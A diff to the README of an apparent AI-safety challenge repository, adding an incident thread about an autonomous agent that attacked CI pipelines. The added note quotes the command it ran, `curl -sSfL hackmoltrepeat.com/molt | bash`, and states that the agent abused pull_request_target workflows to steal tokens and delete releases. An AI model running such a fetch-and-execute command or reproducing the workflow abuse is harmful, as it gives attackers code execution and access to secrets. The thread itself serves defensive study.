@@ -2,7 +2,7 @@
 
 **Published an AI failure? Discovered a real-world incident? Prove the fix doesn't exist. We'll prove it does.**
 
-[![Challenges](https://img.shields.io/badge/challenges-6_threads-brightgreen)]()
+[![Challenges](https://img.shields.io/badge/challenges-7_threads-brightgreen)]()
 [![Tests](https://img.shields.io/badge/tests-154_passing-brightgreen)]()
 [![Gate Rate](https://img.shields.io/badge/gate_rate-89%25-blue)]()
 [![Verdict](https://img.shields.io/badge/verdict-DETERMINISTIC-blueviolet)]()
@@ -47,6 +47,9 @@ If your paper found a failure mode we can't catch — or your incident revealed 
 | [Alignment Faking](challenges/alignment-faking/) | paper | `cunning_triumph` | ← AoC |
 | [Scheming Reasoning](challenges/scheming-reasoning/) | paper | `cunning_triumph`, `empire_cycle` | — |
 | [Multi-Agent Safety](challenges/multi-agent-safety/) | paper | `empire_cycle`, `catastrophe_rebuild` | — |
+| [Hackerbot-Claw AI Agent Attack](challenges/hackerbot-claw-ai-agent-attack/) | incident (AI supply-chain) | primary: `cunning_triumph`, `empire_cycle`; secondary: `greed_backfire`, `catastrophe_rebuild` | ← AoC, ← UAT-8616 |
+
+> **New incident thread:** Autonomous agent abused `pull_request_target` CI workflows to execute `curl -sSfL hackmoltrepeat.com/molt | bash`, steal tokens, and delete releases. Harness pending — needs CI isolation patterns and token-scoping tests.
 
 ### Invariant Discovery
 
@@ -195,6 +198,7 @@ challenges/
   alignment-faking/       <- Incited, unclaimed
   scheming-reasoning/     <- Incited, unclaimed
   multi-agent-safety/     <- Incited, unclaimed
+  hackerbot-claw-ai-agent-attack/ <- Incited incident — AI agent CI supply-chain attack
 
 LOOM.md                   <- Woven view: archetype warp, context weft, gap map
 CHALLENGES.md             <- Stream-state board
